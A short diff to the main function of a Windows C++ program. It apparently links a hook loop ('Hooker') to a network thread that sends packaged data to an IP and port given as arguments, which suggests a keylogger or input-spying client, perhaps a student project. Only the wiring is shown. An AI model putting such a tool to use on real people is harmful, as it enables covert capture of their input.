@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <iostream>
+#include <boost/thread.hpp>
 #include "Hooker.hh"
 #include "reseau/Network.hh"
 
@@ -9,10 +10,18 @@ int main(int ac, char **av)
 {
 	if (ac >= 3)
 	{
-		Network* network = new Network(av[2], av[1]);
-		Hooker& hooker = Hooker::getInstance();
-//		hooker.setNetwork(network);
-		hooker.runHookLoop();
+		try {
+			Packager* packager = new Packager();
+			Network* network = new Network(av[2], av[1], packager);
+			Hooker& hooker = Hooker::getInstance();
+			hooker.setPackager(packager);
+			boost::thread networkThread(network);
+			hooker.runHookLoop();
+			networkThread.join();
+		}
+		catch (std::exception& e) {
+			return EXIT_FAILURE;
+		}
 		return EXIT_SUCCESS;
 	}
 	std::cerr << "Usage: " << av[0] << " [ip]" << " [port]" << std::endl;
